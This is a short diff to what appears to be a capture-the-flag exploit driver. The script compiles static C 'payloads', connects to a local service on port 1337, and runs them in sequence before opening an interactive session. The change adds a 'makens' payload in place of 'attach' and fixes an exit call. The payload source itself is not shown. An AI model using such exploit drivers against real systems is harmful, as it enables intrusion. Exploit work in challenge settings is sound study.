@@ -42,7 +42,7 @@ def build_payloads(payloads):
     for p in payloads:
         ret = os.system(f"gcc --static -Wl,--gc-sections -Os -o {p} payloads/{p}.c && strip -s -R .comment {p}")
         if ret != 0:
-            os.exit(1)
+            sys.exit(1)
 
 def connect_to_local():
     r  = remote("localhost", 1337)
@@ -80,6 +80,7 @@ PAYLOADS = [
             "sleep",
             "server",
             "client",
+            "makens",
            ]
 
 def main():
@@ -94,7 +95,8 @@ def main():
     run_sb(r, "sleep")
     run_elf(r, 1, "client")
     wait()
-    run_elf(r, 0, "attach")
+    run_elf(r, 0, "makens")
+    wait()
     r.interactive()
 
 if __name__ == "__main__":
